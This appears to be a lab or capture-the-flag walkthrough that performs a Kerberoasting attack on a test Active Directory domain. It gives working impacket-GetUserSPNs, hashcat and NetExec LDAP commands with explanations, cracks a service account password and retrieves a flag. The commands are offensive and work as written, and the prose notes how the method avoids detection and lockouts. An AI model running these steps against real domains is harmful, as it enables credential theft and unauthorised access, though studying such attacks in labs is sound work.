### Our first mission is: Enumerate Kerberoastable service accounts and extract their Ticket Granting Service (TGS) hashes

Blueprint:
`impacket-GetUserSPNs [1. Domain]/[2. Active Username]:'[3. Password]' -dc-ip [4. Target DC IP] -request -outputfile [5. Output File]`

Command:

```bash
impacket-GetUserSPNs PENTESTLAB.local/bh_intern:'User@2025!' -dc-ip 192.168.56.20 -request -outputfile kerb_hashes.txt

```

Explanation:

`impacket-GetUserSPNs`: Invokes the Impacket library tool specifically designed to locate user accounts that possess registered Service Principal Names (SPNs) within Active Directory.

`PENTESTLAB.local/bh_intern:'User@2025!'`: Uses the initial low-privileged credential pair to bind and query the Active Directory infrastructure.

`-dc-ip 192.168.56.20`: Directs the initial communication stream and Kerberos requests directly to the target Domain Controller.

`-request`: Commands the tool to actively request Kerberos TGS tickets from the Key Distribution Center (KDC) for any found SPNs, fetching the encrypted components that can be cracked offline.

`-outputfile kerb_hashes.txt`: Dynamically isolates and exports the generated Ticket Granting Service (TGS) response payloads into a clean text file on disk using a hashcat-compatible structure.

Brief Explanation:

> "Query the Active Directory architecture for domain user profiles that act as system services via Service Principal Names (SPNs). Because Kerberos encrypts ticket contents using the service account’s master NT hash, any authenticated user can pull down these service tickets. The process creates a completely passive surface for offline brute-force attacks without tipping off system endpoints."

---

### Our next mission is: Perform an offline cryptographic attack against the captured service ticket hash

Blueprint:
`hashcat -a [1. Attack Mode] -m [2. Hash Type Mode] [3. Input Hash File] [4. Wordlist Path]`

Command:

```bash
hashcat -a 0 -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

```

Explanation:

`hashcat`: Launches the advanced, GPU-accelerated password recovery utility engine.

`-a 0`: Configures the engine to run a straight/dictionary attack sequence against the targeted input vectors.

`-m 13100`: Tells hashcat that the incoming hash architecture follows the explicit structural formatting of a Kerberos 5 TGS-REP (Ticket Granting Service Reply) using RC4-HMAC encryption.

`kerb_hashes.txt`: Passes the file containing the targeted service tickets captured from the directory query phase.

`/usr/share/wordlists/rockyou.txt`: References the baseline wordlist file to supply raw token strings into the hashing engine matrix.

Brief Explanation:

> "Execute a local cryptographic dictionary attack against the captured Kerberos ticket structure. The local machine performs a massive series of key derivation iterations, comparing potential cleartext password variations directly with the tissue of the encrypted ticket blob. This bypasses structural account lockout boundaries completely and returns the plaintext password `Password1` for `svc_backup` instantly."

---

### Our final mission is: Query target directory attributes via the cracked service account to locate flags

Blueprint:
`nxc ldap [1. Target IP] -u '[2. Compromised Service User]' -p '[3. Cracked Password]' --base-dn '[4. Search Anchor]' --query "([5. Identity Filter])" "[6. Target Attributes]"`

Command:

```bash
nxc ldap 192.168.56.20 -u 'svc_backup' -p 'Password1' --base-dn "DC=PENTESTLAB,DC=local" --query "(sAMAccountName=svc_backup)" "cn homeDirectory"

```

Explanation:

`nxc ldap`: Pivots to the NetExec LDAP protocol module to inspect deep directory configuration records.

`-u 'svc_backup' -p 'Password1'`: Uses the freshly cracked service credentials to log in with an authenticated session.

`--base-dn "DC=PENTESTLAB,DC=local"`: Points the directory scanning engine at the root context parameters of the domain structure.

`--query "(sAMAccountName=svc_backup)"`: Applies an individual object search string to pinpoint rows corresponding directly to the compromised service profile.

`"cn homeDirectory"`: Requests the Domain Controller to return the specific Common Name records paired with the exact paths mapped in the home directory variables.

Brief Explanation:

> "Leverage the newly recovered service account session to extract internal domain profile information from the directory schema. Admins frequently plant sensitive target data keys inside description lines or user environment properties like home path configurations. Interrogating the LDAP schema variables exposes the structural deployment string value directly out of the `homeDirectory` container."

Interaction Workflow & Retrieval:

```text
LDAP        192.168.56.20   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PENTESTLAB.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.56.20   389    DC01             [+] PENTESTLAB.local\svc_backup:Password1 (Pwn3d!)
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Backup Service,OU=IT-ServiceAccounts,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                   Backup Service
LDAP        192.168.56.20   389    DC01             homeDirectory        BHFLAG2{K3RB3R04ST_SVC_B4CKUP_F2}

```
